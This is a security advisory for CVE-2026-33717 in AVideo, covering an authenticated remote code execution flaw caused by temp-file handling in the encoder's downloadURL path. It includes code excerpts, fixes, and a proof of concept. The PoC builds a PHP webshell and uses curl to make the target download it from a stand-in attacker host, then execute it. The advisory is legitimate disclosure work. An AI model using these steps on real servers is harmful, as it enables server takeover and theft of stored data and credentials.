# [H] AVideo: Remote Code Execution via PHP Temp File in Encoder downloadURL

## Summary
Severity: High
Advisory: GHSA-8wf4-c4x3-h952
CVE: CVE-2026-33717
CWE: CWE-434
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-8wf4-c4x3-h952
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `downloadVideoFromDownloadURL()` function in `objects/aVideoEncoder.json.php` saves remote content to a web-accessible temporary directory using the original URL's filename and extension (including `.php`). By providing an invalid `resolution` parameter, an attacker triggers an early `die()` via `forbiddenPage()` before the temp file can be moved or cleaned up, leaving an executable PHP file persistently accessible under the web root at `videos/cache/tmpFile/`.

## Details

The vulnerability is a race-free file upload leading to RCE, exploiting a logic flaw in the error handling order of operations.

**Step 1 — File download preserves dangerous extension:**

In `objects/aVideoEncoder.json.php`, when a `downloadURL` parameter is provided, the file is downloaded and saved with the URL's original basename:

```php
// objects/aVideoEncoder.json.php:361-365
$_FILES['video']['name'] = basename($downloadURL);  // preserves .php extension
$temp = Video::getStoragePath() . "cache/tmpFile/" . $_FILES['video']['name'];
make_path($temp);
$bytesSaved = file_put_contents($temp, $file);
```

The `format` parameter (validated against `$global['allowedExtension']` at line 42) is only used later for the *final* destination filename (line 238), not for the temp file. The temp file uses `basename($downloadURL)` directly, allowing any extension including `.php`.

**Step 2 — Resolution validation aborts after file write:**

After the file is downloaded and written to disk (line 156), the resolution is validated:

```php
// objects/aVideoEncoder.json.php:229-233
if (!in_array($_REQUEST['resolution'], $global['avideo_possible_resolutions'])) {
    $msg = "This resolution is not possible {$_REQUEST['resolution']}";
    _error_log($msg);
    forbiddenPage($msg);  // calls die() — execution stops here
}
```

The `forbiddenPage()` function (in `objects/functionsSecurity.php:567-573`) detects the JSON content type set at line 26 and calls `die()`:

```php
if (empty($unlockPassword) && isContentTypeJson()) {
    // ...
    die(json_encode($obj));  // line 573 — execution terminates
}
```

**Step 3 — Cleanup never reached:**

The `decideMoveUploadedToVideos()` call at line 243, which would move the temp file to its final destination with the safe `format` extension, is never reached because `forbiddenPage()` terminates execution first.

**Step 4 — No execution restrictions on temp directory:**

The `videos/cache/tmpFile/` directory has no `.htaccess` file restricting PHP execution. The root `.htaccess` `FilesMatch` on line 73 blocks extensions matching `php[a-z0-9]+` (e.g., `.php5`, `.phtml`) but does **not** match plain `.php`.

## PoC

**Prerequisites:** An authenticated user account with `canUpload` permission. An attacker-controlled server hosting a PHP payload file at least 20KB in size.

**Step 1 — Prepare the PHP payload (on attacker server):**

```bash
# Create a PHP webshell padded to >=20KB to pass the minimum size check
python3 -c "
payload = b'<?php echo \"RCE:\".php_uname(); ?>'
padding = b'\n' + b'/' * (20001 - len(payload))
open('shell.php', 'wb').write(payload + padding)
"
# Host it on an attacker-controlled server (e.g., https://attacker.example.com/shell.php)
```

**Step 2 — Trigger the download with invalid resolution:**

```bash
curl -X POST 'https://target.example.com/objects/aVideoEncoder.json.php' \
  -d 'user=uploader_username' \
  -d 'pass=uploader_password' \
  -d 'format=mp4' \
  -d 'downloadURL=https://attacker.example.com/shell.php' \
  -d 'resolution=9999'
```

Expected response: `{"error":true,"msg":"This resolution is not possible 9999","forbiddenPage":true}`

**Step 3 — Access the persisted PHP file:**

```bash
curl 'https://target.example.com/videos/cache/tmpFile/shell.php'
```

Expected output: `RCE:Linux target 5.15.0-...` — confirming arbitrary PHP code execution on the server.

## Impact

An authenticated user with standard upload permissions can achieve **Remote Code Execution** on the server. This allows:

- Full server compromise — read/write arbitrary files, execute system commands
- Access to database credentials and all stored user data
- Lateral movement to other services on the same network
- Modification or destruction of all video content and platform configuration
- Use of the server as a pivot point for further attacks

The attack requires only a single HTTP request (plus hosting a payload file) and leaves no trace in the application's normal upload/video processing logs beyond the download attempt.

## Recommended Fix

**Fix 1 (Primary) — Validate file extension in `downloadVideoFromDownloadURL()`:**

```php
// objects/aVideoEncoder.json.php — in downloadVideoFromDownloadURL(), after line 360
function downloadVideoFromDownloadURL($downloadURL)
{
    global $global, $obj;
    $downloadURL = trim($downloadURL);

    // ... existing SSRF check ...

    // NEW: Validate the file extension against allowed extensions
    $urlExtension = strtolower(pathinfo(parse_url($downloadURL, PHP_URL_PATH), PATHINFO_EXTENSION));
    if (!in_array($urlExtension, $global['allowedExtension'])) {
        __errlog("aVideoEncoder.json:downloadVideoFromDownloadURL blocked dangerous extension: " . $urlExtension);
        return false;
    }

    // ... rest of function ...
}
```

**Fix 2 (Defense in depth) — Move resolution validation before file download:**

```php
// objects/aVideoEncoder.json.php — move lines 227-236 to BEFORE line 154
// Validate resolution BEFORE downloading anything
if (!empty($_REQUEST['resolution'])) {
    if (!in_array($_REQUEST['resolution'], $global['avideo_possible_resolutions'])) {
        $msg = "This resolution is not possible {$_REQUEST['resolution']}";
        _error_log($msg);
        forbiddenPage($msg);
    }
}
// Then proceed with download...
```

**Fix 3 (Defense in depth) — Add `.htaccess` to temp directory:**

Create `videos/cache/tmpFile/.htaccess`:
```apache
# Deny execution of all scripts in temp directory
<FilesMatch "\.(?i:php|phtml|phar|php[0-9]|shtml)$">
    Require all denied
</FilesMatch>
php_flag engine off
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8wf4-c4x3-h952
- https://nvd.nist.gov/vuln/detail/CVE-2026-33717
- https://github.com/WWBN/AVideo/commit/6da79b43484099a0b660d1544a63c07b633ed3a2
- https://github.com/WWBN/AVideo
